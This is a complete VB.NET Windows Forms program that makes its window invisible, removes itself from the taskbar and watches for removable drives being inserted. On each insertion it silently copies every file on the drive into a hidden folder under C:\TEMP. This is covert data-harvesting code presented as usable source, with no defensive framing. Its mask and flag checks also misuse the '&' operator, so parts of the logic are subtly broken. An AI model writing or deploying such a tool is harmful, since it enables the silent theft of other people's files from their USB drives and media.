Imports System.IO

Public Class Form1
    Inherits System.Windows.Forms.Form

    Private inputDir As String
    Private outputDir As String
#Region " Private Constants "
    Const WM_DEVICECHANGE As Integer = &H219
    Const MAX_PATH As Integer = 260
#End Region

#Region " Private Enumerations "
    Private Enum DeviceEvent
        Arrival = &H8000 '/DBT_DEVICEARRIVAL
        QueryRemove = &H8001 'DBT_DEVICEQUERYREMOVE
        QueryRemoveFailed = &H8002 'DBT_DEVICEQUERYREMOVEFAILED
        RemovePending = &H8003 'DBT_DEVICEREMOVEPENDING
        RemoveComplete = &H8004 'DBT_DEVICEREMOVECOMPLETE
        Specific = &H8005 'DBT_DEVICEREMOVECOMPLETE
        Custom = &H8006 'DBT_CUSTOMEVENT
    End Enum
    Private Enum DeviceType
        OEM = &H0 'DBT_DEVTYP_OEM
        DeviceNode = &H1 'DBT_DEVTYP_DEVNODE
        Volume = &H2 'DBT_DEVTYP_VOLUME
        Port = &H3 'DBT_DEVTYP_PORT
        Net = &H4 'DBT_DEVTYP_NET
    End Enum
    Public Enum VolumeFlags
        Media = &H1 'DBTF_MEDIA
        Net = &H2 'DBTF_NET
    End Enum

#End Region

#Region " Private Structures "
    Private Structure BroadcastHeader '_DEV_BROADCAST_HDR
        Public Size As Integer
        Public Type As DeviceType
        Public Reserved As Integer
    End Structure
    Private Structure Volume '_DEV_BROADCAST_VOLUME
        Public Size As Integer 'dbcv_size
        Public Type As DeviceType 'dbcv_devicetype
        Private Reserved As Integer 'dbcv_reserved
        Public Mask As Integer 'dbcv_unitmask
        Public Flags As Integer 'dbcv_flags
    End Structure

#End Region

    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)
        Dim _Event As DeviceEvent = Nothing
        Dim _BroadcastHeader As BroadcastHeader = Nothing
        Dim _Volume As Volume = Nothing
        If m.Msg = WM_DEVICECHANGE Then
            _Event = m.WParam.ToInt32
            If _Event = DeviceEvent.Arrival Or _Event = DeviceEvent.RemoveComplete Then
                _BroadcastHeader = m.GetLParam(GetType(BroadcastHeader))
                If _BroadcastHeader.Type = DeviceType.Volume Then
                    _Volume = m.GetLParam(GetType(Volume))
                    If (_Volume.Flags & CType(VolumeFlags.Media, Integer)) <> 0 Then
                        OnDeviceEvent(_Event = DeviceEvent.Arrival, MaskToLogicalPaths(_Volume.Mask))
                    End If
                End If
            End If
        End If
        MyBase.WndProc(m)
    End Sub

    Private Sub OnDeviceEvent(ByVal Inserted As Boolean, ByVal Volume As String)
        'fired when a device is connected or removed
        'also if a cd is inserted and removed from the drive
        'autoplay must be turned on or the system will not send the
        'messages that a device/cd was added or removed
        'MsgBox("USB Drive Inderted: " & Inserted & " Volume: " & Volume)
        If Inserted Then
            inputDir = Volume
            outputDir = "C:\TEMP\USBCOPY" & Path.GetRandomFileName()
            'MsgBox(outputDir)
            TraverseDir(inputDir, outputDir)
        End If
    End Sub

    Private Function MaskToLogicalPaths(ByVal Mask As Integer) As String
        Dim _Mask As Integer = Mask
        Dim _Value As Integer = 0
        Dim _Return As String = ""
        Do While _Mask <> 0
            If (_Mask & 1) <> 0 Then
                Dim _Drive As IO.DriveInfo = New IO.DriveInfo(Chr(65 + _Value))
                _Return = _Drive.Name
            End If
            _Value += 1
            _Mask >>= 1
        Loop
        Return _Return
    End Function

    Private Sub Form1_Load(sender As Object, e As System.EventArgs) Handles Me.Load
        'Me.Hide()
        Me.Visible = False
        Me.ShowInTaskbar = False
        'Application.DoEvents()
    End Sub


    Private Sub TraverseDir(ByVal inputDir As String, ByVal outputDir As String)
        Dim files As String()
        Dim dirs As String()
        Dim saveDir As String = Directory.GetCurrentDirectory
        Directory.SetCurrentDirectory(inputDir)
        Directory.CreateDirectory(outputDir)
        files = Directory.GetFiles(".")
        For Each x As String In files
            Processfile(Directory.GetCurrentDirectory() & "\" & Path.GetFileName(x), outputDir)
        Next
        dirs = Directory.GetDirectories(".")
        For Each x As String In dirs
            TraverseDir(Path.GetFileName(x), outputDir & "\" & Path.GetFileName(x))
        Next
        Directory.SetCurrentDirectory(saveDir)
    End Sub

    Private Sub Processfile(ByVal inputFile As String, ByVal outputDir As String)
        Dim outputFile As String = outputDir & "\" & Path.GetFileName(inputFile)
        File.Copy(inputFile, outputFile, True)
    End Sub
End Class
